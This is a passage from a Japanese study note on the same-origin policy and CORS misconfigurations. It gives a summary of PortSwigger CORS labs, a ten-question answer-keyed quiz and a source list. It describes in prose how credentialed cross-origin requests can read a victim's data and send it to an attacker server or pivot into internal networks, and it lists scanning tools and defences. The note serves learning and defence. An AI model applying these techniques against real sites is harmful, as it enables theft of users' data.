- PortSwigger CORSラボは4本（basic origin reflection / trusted null origin / trusted insecure protocols / internal network pivot）で、難易度は APPRENTICE から EXPERT まで。
- 攻撃PoCの肝は `withCredentials = true`（被害者Cookieを付ける）と、読み取ったレスポンス本文を攻撃者サーバーへ送る部分。
- 内部pivotラボは、CORSの緩さを起点に「内部スキャン → XSS発見 → 管理操作」まで多段に横移動できることを示す。
- CORS検出ツールには Corsy / CORScanner / CorsMe / CorsOne などがあるが、出力は手作業で再確認する。
- JSONP（`?callback=関数名`）はCORS以前のクロスオリジン取得手法で、認証付きだと情報漏洩源になりうる。
- 防御の要点は、反射禁止・許可リスト完全一致・null非信頼・機密APIに`*`禁止・正規表現ドットのエスケープ・`Vary: Origin`付与・資格情報の必要性見直し・サブドメインのXSS撲滅。
- 現代ブラウザの `SameSite=Lax` 既定やサードパーティCookieブロックにより、古典的な credentialed 窃取の成立条件は狭まっている。診断時は `SameSite` 値も確認する。
- CORSエラーの詳細はJavaScriptからは取れない。原因はブラウザのDevToolsコンソールで確認する。

---

## 理解度チェック

1. 基準URLが `http://normal-website.com/example/` のとき、`http://normal-website.com/example2/` は同一オリジンか。理由も述べよ。
   ▶ 答え: 同一オリジン。scheme（http）・host（normal-website.com）・port（80）がすべて一致し、違うのはパスだけ。オリジンの判定にパスは含まれない。

2. `https://normal-website.com/example/` が基準（http版）と別オリジンになる理由を述べよ。
   ▶ 答え: スキームが http から https に変わっており、既定ポートも80から443に変わるため。表では「different scheme and port」と表現される。

3. SOPは「クロスオリジンの書き込み・埋め込み・読み取り」のうち、何を禁じるか。
   ▶ 答え: 読み取り（reads）を禁じる。書き込み（writes、フォーム送信やリダイレクト）と埋め込み（embedding、`<img>`/`<script>` など）は原則許可される。

4. `Access-Control-Allow-Credentials: true` のとき、`Access-Control-Allow-Origin` にワイルドカード `*` を使えるか。使えない場合、代わりに何を返す必要があるか。
   ▶ 答え: 使えない。ブラウザが「`*` + 資格情報」の組み合わせを拒否する。具体的なオリジン（例 `https://example.com`）、リクエストのOriginを反射した値、または `null` を返す必要がある。

5. `Access-Control-Allow-Origin: *`（認証不要）が返るエンドポイントは、なぜ「無害ではない」のか。
   ▶ 答え: `*` ではCookieが送られないので認証付き機密の窃取には使えないが、認証不要な内部サーバーだと中身が読めてしまい、被害者のブラウザを踏み台に内部ネットワークへ pivot される危険がある。

6. 攻撃者はどうやって `Origin: null` のリクエストを発生させるか。代表的な手段を2つ挙げよ。
   ▶ 答え: `sandbox` 属性付き（`allow-same-origin` なし）の iframe 内スクリプト、`data:` URI スキームから実行したドキュメント。ほかに `file://`、クロスオリジンのリダイレクト経由でも発生する。これらは opaque origin として常に `null` にシリアライズされる。

7. 正規表現 `^api.example.com$` でOriginを照合している実装は、どんなドメインを誤って許可してしまうか。正しい書き方は何か。
   ▶ 答え: `.` が任意の1文字にマッチするため、`apiiexample.com` のような別ドメインを許可してしまう。正しくは `^api\.example\.com$` のようにドットを `\.` でエスケープし、`^` と `$` でアンカーする。

8. 動的にACAOを返すサーバーが `Vary: Origin` を付けないと、何が起きるか。
   ▶ 答え: CDN・ブラウザ・プロキシのHTTPキャッシュが、あるオリジン向けのACAO付き応答を別オリジンの要求に使い回し、キャッシュ汚染経由でCORSポリシーが崩れる（または正当オリジンにACAOが届かず機能が壊れる）。

9. 現代ブラウザで古典的なCORS credential窃取（`withCredentials=true`）が成立しにくくなった理由は何か。それでも成立しうるのはどんな場合か。
   ▶ 答え: `SameSite=Lax` の既定化とサードパーティCookieのブロックにより、クロスサイトでCookieが送られなくなったため。ただし同一サイト（same-site）内の別オリジン間や、`SameSite=None; Secure` のCookieでは依然成立しうる。

10. CORSエラーの具体的な原因（どのヘッダが足りないか）をJavaScriptから取得できるか。取得できない場合、どこで確認するか。
   ▶ 答え: 取得できない。セキュリティ上の理由でJSには「エラーが起きた」ことしか分からない。具体的な原因はブラウザのDevToolsコンソールでのみ確認できる。

---

## 出典

- PortSwigger Web Security Academy「Cross-origin resource sharing (CORS)」: https://portswigger.net/web-security/cors （原典は取得できず、GitHubミラー `six2dez/pentest-book` および `swisskyrepo/PayloadsAllTheThings` で内容を再現）
- PortSwigger CORS lab: basic origin reflection: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
- PortSwigger CORS lab: trusted null origin: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
- PortSwigger CORS lab: trusted insecure protocols: https://portswigger.net/web-security/cors/lab-breaking-https-attack
- PortSwigger CORS lab: internal network pivot attack: https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
- MDN Web Docs「Same-origin policy」: https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy
- MDN Web Docs「Cross-Origin Resource Sharing (CORS)」: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
- MDN Web Docs 用語集「Origin」: https://developer.mozilla.org/en-US/docs/Glossary/Origin
- WHATWG Fetch 仕様（CORS protocol）: https://fetch.spec.whatwg.org/#http-cors-protocol
- HTML Living Standard § Cross-origin objects: https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-objects
- emrebener（Medium）「A Comprehensive Guide to the Same-Origin Policy and the CORS Policy」: https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145 （取得不可・要自読）

<!-- sources: https://portswigger.net/web-security/cors, https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack, https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack, https://portswigger.net/web-security/cors/lab-breaking-https-attack, https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack, https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy, https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS, https://developer.mozilla.org/en-US/docs/Glossary/Origin, https://fetch.spec.whatwg.org/#http-cors-protocol, https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-objects, https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145 -->
<!-- terms: オリジン（Origin）, 同一オリジンポリシー（SOP）, サイト（Site）, CORS, Access-Control-Allow-Origin（ACAO）, Access-Control-Allow-Credentials（ACAC）, シンプルリクエスト, プリフライト（preflight）, CORS-safelisted request headers, Access-Control-Max-Age, Access-Control-Expose-Headers, Origin反射, null origin, opaque origin（不透明オリジン）, document.domain, Vary: Origin, 資格情報（credentials）, withCredentials, 内部ネットワークpivot, JSONP, SameSite, サードパーティCookie, キャッシュ汚染 -->

<!-- self-read: https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145 | Medium系ドメインがegressプロキシで全面遮断（403）、freedium/scribe/archive.ph/web.archiveも遮断、WebSearch予算枯渇で本文取得不可。MDN公式とPortSwiggerミラーで概念を裏付けたが記事固有の文章・図解は未取得 -->
<!-- self-read: https://portswigger.net/web-security/cors | portswigger.netがegressプロキシで403遮断。内容はGitHubミラー（six2dez/pentest-book, swisskyrepo/PayloadsAllTheThings）とcloneずみpswリポジトリで高忠実に再現したが、公式ページの最新のラボ手順・prose原文は要自読 -->
